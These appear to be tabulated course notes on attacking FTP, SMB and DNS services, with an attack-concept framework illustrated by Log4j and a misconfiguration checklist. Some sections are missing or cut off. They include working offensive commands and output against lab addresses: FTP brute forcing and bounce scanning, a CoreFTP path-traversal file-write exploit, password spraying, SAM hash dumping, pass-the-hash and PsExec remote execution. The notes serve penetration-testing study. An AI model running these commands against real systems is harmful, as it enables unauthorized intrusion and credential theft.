# Protocol Specific Attacks
## The Concept of Attacks

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|Concept|Outlined plan applied to future projects; general categorization (e.g., house: basement, four walls, roof)|
|Goal|Create pattern template for attacks on all possible services; divide into categories that summarize services but leave individual attack methods|
|**Four Categories**||
|Source|Source of information used for specific task of a process|
|Processes|Processing information forwarded from source; according to intended task determined by program code|
|Privileges|Permissions determining what tasks and actions can be performed on system|
|Destination|Where changes will be made; local or remote processing point|
|**Source — Information Types**||
|Code|Already executed program code results used as source|
|Libraries|Collection of program resources (configuration data, documentation, help data, message templates, prebuilt code, subroutines, classes, values, type specifications)|
|Config|Static or prescribed values determining how process processes information|
|APIs|Application programming interface used as interface for retrieving/providing information|
|User Input|Manual entry of information by person|
|**Example — Log4j (Source)**||
|CVE|CVE-2021-44228 (published end of 2021)|
|What|Framework/library used to log application messages in Java and other languages; standard within many open source/commercial products|
|Attack|Attacker manipulates HTTP User-Agent header and inserts JNDI lookup as command intended for Log4j library; not actual User-Agent header processed but JNDI lookup|
|**Processes — Components**||
|PID|Process-ID identifies process being started or already running; running processes have assigned privileges|
|Input|Input of information assigned by user or as result of programmed function|
|Data processing|Hard-coded functions dictate how received information is processed|
|Variables|Placeholders for information that different functions can further process|
|Logging|Certain events documented and stored in register or file; information remains in system|
|**Log4j (Processes)**||
|Process|Log User-Agent as string using function and store in designated location|
|Vulnerability|Misinterpretation of string → execution of request instead of logging events|
|**Privileges — Areas**||
|System|Highest privileges allowing any system modification; Windows: SYSTEM; Linux: root|
|User|Permissions assigned to specific user; separate users often set up for particular services during Linux installation|
|Groups|Categorization of at least one user with certain permissions to perform specific actions|
|Policies|Determine execution of application-specific commands; can apply to individual/grouped users and actions|
|Rules|Permissions to perform actions handled from within applications themselves|
|**Log4j (Privileges)**||
|Danger|Logs often considered sensitive (data about service, system, customers); stored in locations no regular user should access; most applications with Log4j run with administrator privileges|
|Exploitation|Process exploited library by manipulating User-Agent → misinterpretation of source → execution of user-supplied code|
|**Destination — Areas**||
|Local|System's environment where process occurred; results processed further (changes to data sets or storage)|
|Network|Forwarding results of process to remote interface (IP address and services, entire networks); can influence route|
|**Log4j (Destination)**||
|Result|Misinterpretation of User-Agent → JNDI lookup executed as command with administrator privileges → queries remote server controlled by attacker|
|Query|Requests Java class created by attacker; manipulated for own purposes; queried Java code executed in same process → RCE vulnerability|
|**Attack Cycle — Initiation**||
|Step 1|Attacker manipulates user agent with JNDI lookup command (Source)|
|Step 2|Process misinterprets assigned user agent → execution of command (Process)|
|Step 3|JNDI lookup command executed with administrator privileges due to logging permissions (Privileges)|
|Step 4|JNDI lookup points to attacker's server containing malicious Java class (Destination)|
|**Attack Cycle — Trigger RCE**||
|Step 5|Malicious Java class retrieved from attacker's server → used as source for further actions (Source)|
|Step 6|Malicious code of Java class read in → remote access to system (Process)|
|Step 7|Malicious code executed with administrator privileges due to logging permissions (Privileges)|
|Step 8|Code leads back over network to attacker with functions allowing remote control (Destination)|
|**Key Takeaway**||
|Application|Pattern template for analyzing/understanding exploits; debugging own exploits; source code analysis; thinking categorically about each task's dangers|

## Service Misconfigurations

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|Definition|Misconfigurations happen when administrator/developer does not correctly configure security framework of application, website, desktop, or server → dangerous open pathways for unauthorized users|
|**Authentication**||
|Default credentials|Historically widespread (username/password); many administrators leave unchanged; most software now asks users to set up credentials upon installation; still find vendors using default credentials (especially older applications)|
|Weak/no passwords|Administrator may use weak passwords or no passwords when setting up services with idea to change later|
|Password policy|Define password policies; require minimum password complexity to avoid combinations like `admin:admin`, `admin:password`, `admin:<blank>`, `root:12345678`, `administrator:Password`|
|Action|Grab service banner → identify possible default credentials → try weak username/password combinations|
|**Anonymous Authentication**||
|Definition|Service configured to allow anonymous authentication; anyone with network connectivity can access service without being prompted for authentication|
|**Misconfigured Access Rights**||
|Example|User role is to upload files to FTP server but given right to read every FTP document|
|Risk|Files with configuration information, plain text credentials, usernames, proprietary information, PII; lower-level users access private information that only managers/admins should have|
|Alternatives|Role-based access control (RBAC), Access control lists (ACL); read "Choosing the best access control strategy" by Warren Parad from Authress|
|**Unnecessary Defaults**||
|Definition|Initial configuration includes settings, features, files, credentials; aimed at usability rather than security; leaving default is not good security practice in production environment|
|Action|Change settings to secure system by reducing attack surface|
|Risk|Attackers obtain access credentials or abuse weak setting via short internet search|
|**OWASP Top 10 — Security Misconfiguration (related to default values)**||
|1|Unnecessary features enabled/installed (ports, services, pages, accounts, privileges)|
|2|Default accounts and passwords enabled and unchanged|
|3|Error handling reveals stack traces or overly informative error messages|
|4|For upgraded systems, latest security features disabled or not configured securely|
|**Preventing Misconfiguration**||
|Strategy|Lock down most critical infrastructure; only allow desired behavior; disable any communication not required by program|
|Actions|Admin interfaces disabled; debugging turned off; disable default usernames/passwords; set up server to prevent unauthorized access, directory listing, and other issues; run scans and audits regularly|
|**OWASP Top 10 — Securing Installation Processes**||
|1|Repeatable hardening process; development, QA, and production environments configured identically with different credentials; automated to minimize effort|
|2|Minimal platform without unnecessary features, components, documentation, samples; remove or do not install unused features/frameworks|
|3|Task to review and update configurations appropriate to all security notes, updates, patches as part of patch management; review cloud storage permissions (e.g., S3 bucket permissions)|
|4|Segmented application architecture with effective and secure separation between components/tenants; segmentation, containerization, or cloud security groups (ACLs)|
|5|Sending security directives to clients (e.g., security headers)|
|6|Automated process to verify effectiveness of configurations and settings in all environments|

# FTP
## Attacking FTP

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|FTP|Standard network protocol to transfer files between computers; performs directory and file operations (changing working directory, listing files, renaming/deleting directories or files); default TCP/21|
|Attack approach|Abuse misconfiguration/excessive privileges; exploit known vulnerabilities; discover new vulnerabilities; be aware of directory content to search for sensitive/critical information|
|Design|Protocol designed to trigger downloads/uploads with commands; file management system available to user (hierarchical directory structure); companies use for software/website development|
|**Enumeration**||
|`sudo nmap -sC -sV -p 21 192.168.2.142`|Nmap default scripts (`-sC` includes `ftp-anon` checking anonymous logins) + version enumeration (`-sV` provides FTP banner/version)|
|Output|`ftp-anon: Anonymous FTP login allowed (FTP code 230)`; directories: `.banner`, `bin`, `etc`, `incoming [NSE: writeable]`, `lib`, `pub`; `Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.`|
|Tools|ftp client, nc|
|**Misconfigurations — Anonymous Authentication**||
|Access|Use `anonymous` username and no password|
|Risk|Read/write permissions not set up correctly → sensitive information stored in folder accessible to anonymous user|
|Exploitation|Download sensitive information or upload dangerous scripts; using other vulnerabilities (path traversal in web application) find file location and execute as PHP code|
|`ftp 192.168.2.142`|Connect; `Name: anonymous`; `Password:` (blank); `230 Login successful`|
|Commands|`ls`, `cd` (move around directories); `get` (download single file); `mget` (download multiple files); `put` (upload simple file); `mput` (upload multiple files); `help` (more information)|
|Reference|Footprinting module covers detailed misconfigurations|
|**Protocol Specifics Attacks**||
|Note|Not attacking individual protocols themselves but services that use them; dozens of services per protocol processing information differently|
|**Brute Forcing**||
|When|No anonymous authentication available|
|Tool|Medusa|
|`medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp`|Brute force FTP|
|Options|`-u` single user; `-U` file with usernames; `-P` file with passwords; `-M` protocol (FTP); `-h` target hostname/IP|
|Output|`ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]`|
|Note|Most applications today prevent brute-force attacks; more effective method is Password Spraying|
|**FTP Bounce Attack**||
|Definition|Network attack using FTP servers to deliver outbound traffic to another device on network; attacker uses PORT command to trick FTP connection into running commands and getting information from device other than intended server|
|Scenario|Target FTP_DMZ exposed to internet; Internal_DMZ not exposed; use connection to FTP_DMZ to scan Internal_DMZ using FTP Bounce attack; obtain information about open ports|
|`nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2`|Perform FTP bounce attack (`-b` flag)|
|Output|`Resolved FTP bounce attack proxy to 10.10.110.213`; `Connected:220 (vsFTPd 3.0.3)`; `Login credentials accepted by FTP server!`; `Initiating Bounce Scan`; `FTP command misalignment detected ... correcting`; `80/tcp open http`|
|Note|Modern FTP servers include protections by default; if misconfigured, server can become vulnerable|
|Note|When spawning target, wait up to 60 more seconds after seeing IP address to ensure service launched correctly|

## Latest FTP Vulnerabilities

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|Focus|One previously shown attack presented simply without too much technical detail; concept of attack through example related to specific service|
|**CVE-2022-22836 — CoreFTP before build 727**||
|Vulnerability|FTP service does not correctly process HTTP PUT request → authenticated directory/path traversal + arbitrary file write vulnerability|
|Impact|Write files outside directory to which service has access|
|Mechanism|FTP service uses HTTP POST request to upload files; CoreFTP service allows HTTP PUT request → write content to files|
|Exploit|Single cURL command|
|`curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops`|CoreFTP exploitation|
|Explanation|`-X PUT` raw HTTP PUT request; `--basic -u <username>:<password>` basic auth; `--path-as-is https://<IP>/../../../../../whoops` path for file; `--data-binary "PoC."` content; `-H "Host: <IP>"` host header|
|**Concept of Attacks — Directory Traversal**||
|Step 1|User specifies type of HTTP request with file's content, including escaping characters to break out of restricted area (Source)|
|Step 2|Changed type of HTTP request, file contents, and path entered by user taken over and processed by process (Process)|
|Step 3|Application checks whether user is authorized to be in specified path; restrictions only apply to specific folder → all permissions granted bypassed as it breaks out of folder using directory traversal (Privileges)|
|Step 4|Destination is another process tasked with writing specified contents of user on local system (Destination)|
|Result|Bypassed constraints imposed by application using escape characters (`../../../../`); cycle starts all over again to write contents to target system|
|**Concept of Attacks — Arbitrary File Write**||
|Step 5|Same information user entered used as source: filename (`whoops`) and contents (`--data-binary "PoC."`) (Source)|
|Step 6|Process takes specified information and proceeds to write desired content to specified file (Process)|
|Step 7|Since all restrictions bypassed during directory traversal vulnerability, service approves writing contents to specified file (Privileges)|
|Step 8|Filename specified by user (`whoops`) with desired content (`"PoC."`) serves as destination on local system (Destination)|
|**Verification**||
|`type C:\whoops`|Output: `PoC.`|
|Result|File with corresponding contents found on target system|

# SMB
## Attacking SMB

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|SMB|Server Message Block — communication protocol for shared access to files and printers across nodes on network|
|History|Initially designed to run on NetBIOS over TCP/IP (NBT) using TCP 139 and UDP 137/138; Windows 2000 added direct SMB over TCP/IP on port 445 without NetBIOS layer; modern Windows uses SMB over TCP but supports NetBIOS as failover|
|Samba|Unix/Linux-based open-source implementation of SMB protocol; allows Linux/Unix servers and Windows clients to use same SMB services|
|MSRPC|Microsoft Remote Procedure Call — generic way to execute procedure in local/remote process; MS-RPCE defines RPC over SMB Protocol using SMB named pipes as underlying transport|
|Attack approach|Understand implementation, OS, tools; abuse misconfiguration/excessive privileges; exploit known/discover new vulnerabilities; be aware of directory content in shared folders; identify what information/action possible with NetBIOS or RPC|
|**Enumeration**||
|`sudo nmap 10.129.14.128 -sV -sC -p139,445`|Scan ports 139 and 445|
|Output|`139/tcp open netbios-ssn Samba smbd 4.6.2`; `445/tcp open netbios-ssn Samba smbd 4.6.2`; `nbstat: NetBIOS name: HTB`; `smb2-security-mode: Message signing enabled but not required`; `smb2-time`|
|Findings|SMB version (Samba smbd 4.6.2); hostname HTB; OS Linux based on SMB implementation|
|Note|When targeting Windows OS, version information usually not included in Nmap scan results; Nmap tries to guess OS version; need other scans to identify vulnerable exploits|
|**Misconfigurations — Anonymous Authentication**||
|Null session|SMB configured not to require authentication; log in with no username or password|
|Tools|smbclient, smbmap, rpcclient, enum4linux|
|**File Share — smbclient**||
|`smbclient -N -L //10.129.14.128`|List shares with null session (`-N`); output: ADMIN$ (Remote Admin), C$ (Default share), notes (CheckIT), IPC$ (IPC Service); `SMB1 disabled no workgroup available`|
|**File Share — smbmap**||
|`smbmap -H 10.129.14.128`|Enumerate shares and permissions; output: ADMIN$ (NO ACCESS), C$ (NO ACCESS), IPC$ (READ ONLY), notes (READ, WRITE)|
|`smbmap -H 10.129.14.128 -r notes`|Browse directories recursively (`-r` or `-R`); output: `.\notes\*` (LDOUJZWBSG, note.txt, SDT65CB.tmp, TPLRNSMWHQ, WDJEQFZPNO, WindowsImageBackup)|
|`smbmap -H 10.129.14.128 --download "notes\note.txt"`|Download file|
|`smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"`|Upload file|
|**Remote Procedure Call (RPC)**||
|`rpcclient -U'%' 10.10.110.17`|Null session; `enumdomusers` → user:[mhope] rid:[0x641], user:[svc-ata] rid:[0xa2b], user:[svc-bexec] rid:[0xa2c], user:[roleary] rid:[0xa36], user:[smorgan] rid:[0xa37]|
|Reference|SANS Institute cheat sheet; rpcclient man page|
|**Enum4linux-ng**||
|`./enum4linux-ng.py 10.10.11.45 -A -C`|Automates common enumeration: Workgroup/Domain name, Users information, Operating system information, Groups information, Shares Folders, Password policy information|
|Output|Target information; Service Scan (LDAP, LDAPS, SMB, SMB over NetBIOS); NetBIOS Names and Workgroup (WORKGROUP, WIN-752039204, MAC Address); SMB Dialect Check|
|Note|Original tool written in Perl, rewritten by Mark Lowe in Python|
|**Protocol Specifics Attacks**||
|If no null session|Need credentials; two common ways: brute forcing and password spraying|
|Brute forcing|Try many passwords against account; can lock out account if hitting threshold|
|Password spraying|Better alternative; target list of usernames with one common password to avoid account lockouts; try more than one password if know account lockout threshold (2-3 attempts safe, wait 30-60 minutes between attempts)|
|**Password Spraying — CrackMapExec**||
|`cat /tmp/userlist.txt`|Administrator, jrodriguez, admin, ..., jurena|
|`crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth`|Password spray against one IP|
|Output|STATUS_LOGON_FAILURE for most; `[+] WIN7BOX\jurena:Company01! (Pwn3d!)`|
|Options|`-u` file with user list; `-p` password; `--local-auth` for non-domain joined computer; `--continue-on-success` to continue spraying after valid password found|
|**SMB — Windows Attack Surface**||
|Actions limited by privileges|If user is Administrator or has specific privileges: Remote Command Execution, Extract Hashes from SAM Database, Enumerating Logged-on Users, Pass-the-Hash (PTH)|
|**Remote Code Execution (RCE) — PsExec**||
|Sysinternals|Created 1996 by Mark Russinovich and Bryce Cogswell; acquired by Microsoft July 18, 2006; PsExec lets execute processes on other systems with full interactivity|
|How PsExec works|Windows service image inside executable; deploys service to admin$ share (by default); uses DCE/RPC interface over SMB to access Windows Service Control Manager API; starts PSExec service on remote machine; creates named pipe to send commands|
|Linux implementations|Impacket PsExec, Impacket SMBExec (instantiates local SMB server for output; useful when target has no writeable share), Impacket atexec (through Task Scheduler service), CrackMapExec (smbexec and atexec), Metasploit PsExec|
|`impacket-psexec administrator:'Password123!'@10.10.110.17`|Connect to remote machine with local administrator account|
|Output|Requesting shares; Found writable share ADMIN$; Uploading file; Opening SVCManager; Creating service; Starting service; shell → `nt authority\system` / `WIN7BOX`|
|**CrackMapExec — Command Execution**||
|`crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`|Run CMD command (`-x` cmd, `-X` PowerShell)|
|Output|`[+] .\Administrator:Password123! (Pwn3d!)`; `[+] Executed command via smbexec`; `nt authority\system`|
|Note|If `--exec-method` not defined, tries atexec; if fails, specify `--exec-method smbexec`|
|**Enumerating Logged-on Users**||
|`crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`|Enumerate logged-on users on all machines in network|
|Output|WIN7BOX\Administrator, WIN7BOX\jurena, WIN10BOX\demouser|
|**Extract Hashes from SAM Database**||
|SAM|Security Account Manager — database file storing users' passwords; authenticate local and remote users|
|Uses|Authenticate as another user; Password Cracking; Pass The Hash|
|`crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`|Dump SAM hashes|
|Output|Administrator:500:...:2b576acbe6bcfda7294d6bd18041b8fe:::; Guest, DefaultAccount, WDAGUtilityAccount, jurena, demouser; `[+] Added 6 SAM hashes to the database`|
|**Pass-the-Hash (PtH)**||
|Definition|Authenticate to remote server/service using underlying NTLM hash of user's password instead of plaintext password|
|Tools|Any Impacket tool, SMBMap, CrackMapExec|
|`crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`|PtH with CrackMapExec|
|Output|`[+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)`|

|Vulnerability type|Integer overflow in function of SMB driver allowing system commands to be overwritten while accessing memory|
|Integer overflow|CPU attempting to generate number greater than value required for allocated memory space; arithmetic operations can return unexpected values; example: programmer does not allow negative number to occur; variable performs operation resulting in negative number → returned as positive integer|

|Reference|Stack-Based Buffer Overflows on Linux x86, Stack-Based Buffer Overflows on Windows x86 modules|

|Occurrence|Processing malformed compressed message after Negotiate Protocol Responses; if SMB server allows requests (over TCP/445), compression supported; server and client set terms of communication before client sends more data|
|Exploitation|Data transmitted exceeds integer variable limits due to excessive amount of data → parts written into buffer → overwriting subsequent CPU instructions → interrupts normal/planned execution|
|Control|Data sets structured so overwritten instructions replaced with attacker's own → force CPU (and process) to perform other tasks/instructions|
|**Initiation of the Attack**||
|Step 1|Client sends request manipulated by attacker to SMB server (Source)|
|Step 2|Sent compressed packets processed according to negotiated protocol responses (Process)|
|Step 3|Process performed with system's privileges or at least administrator privileges (Privileges)|
|Step 4|Local process used as destination to process compressed packets (Destination)|
|**Trigger Remote Code Execution**||
|Step 5|Sources used in second cycle from previous process (Source)|
|Step 6|Integer overflow occurs by replacing overwritten buffer with attacker's instructions; forcing CPU to execute those instructions (Process)|
|Step 7|Same privileges of SMB server used (Privileges)|
|Step 8|Remote attacker system used as destination; granting access to local system (Destination)|
|**Key Takeaway**||
|Application|Despite complexity due to buffer manipulation (visible in PoC), concept of attack applies|

## Latest DNS Vulnerabilities

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|Subdomain takeover|Thousands of subdomains/domains point to no longer active third-party service providers (AWS, GitHub, etc.); display error message as confirmation of deactivated third-party service|
|Why common|Companies cancel services from third-party providers but forget to delete associated DNS records (no additional costs for DNS entry)|
|Bug bounty|Well-known platforms (HackerOne) explicitly list Subdomain Takeover as bounty category|
|Study|RedHuntLabs (2020): over 400,000 subdomains out of 220 million vulnerable to subdomain takeover; 62% belonged to e-commerce sector; 33 third-party services prone to vulnerability; 424,120 possible takeovers; 139 in Alexa Top 1000|
|**The Concept of the Attack**||
|Biggest danger|Phishing campaign launched that is considered part of official domain of target company; customers see link with official domain (e.g., `customer-drive.inlanefreight.com` pointing to nonexisting S3 bucket from AWS) and trust it|
|Attacker action|Mirror or create page to provoke login by company's customers|
|Vulnerability condition|CNAME record in company's DNS records points to subdomain that no longer exists and returns HTTP 404 error → subdomain can most likely be taken over through use of third-party provider|
|Mechanism|Subdomain points to another domain using CNAME record that does not currently exist; attacker registers nonexistent domain → subdomain points to domain registration by attacker; single DNS change makes attacker owner of particular subdomain; can manage subdomain as chosen|
|Result|Existing subdomain no longer points to third-party provider and no longer occupied by this provider; anyone can register this subdomain as their own; visiting subdomain with CNAME record in company's DNS leads to things working as expected; design and function of subdomain in hands of attacker|
|**Initiation of Subdomain Takeover**||
|Step 1|Source: subdomain name no longer used by company that we discovered (Source)|
|Step 2|Registration of this subdomain on third-party provider's site done by registering and linking to own sources (Process)|
|Step 3|Privileges lie with primary domain owner and its entries in its DNS servers; third-party provider not responsible for whether subdomain accessible via others (Privileges)|
|Step 4|Successful registration and linking done on attacker's server (Destination)|
|Result|Cycle starts all over again to trigger forwarding to server we control|
|**Trigger the Forwarding**||
|Step 5|Visitor of subdomain enters URL in browser; outdated DNS record (CNAME) not removed used as source (Source)|
|Step 6|DNS server looks in its list to see if it has knowledge about this subdomain; if so, user redirected to corresponding subdomain (controlled by attacker) (Process)|
|Step 7|Privileges lie with administrators managing domain (only they authorized to change domain and its DNS servers); since subdomain in list, DNS server considers subdomain trustworthy and forwards visitor (Privileges)|
|Step 8|Destination: person who requests IP address of subdomain where they want to be forwarded via network (Destination)|
|**Other Uses**||
|Attacks|Phishing, stealing cookies, cross-site request forgery (CSRF), abusing CORS, defeating content security policy (CSP)|
|Examples|HackerOne website shows examples of subdomain takeovers earning bug bounty hunters considerable payouts|

## Attacking Email Services

|**Category**|**Details**|

|**Core Concepts**||
|Mail server|Handles and delivers email over network (usually Internet); receives emails from client and sends to other mail servers; delivers emails to client device|
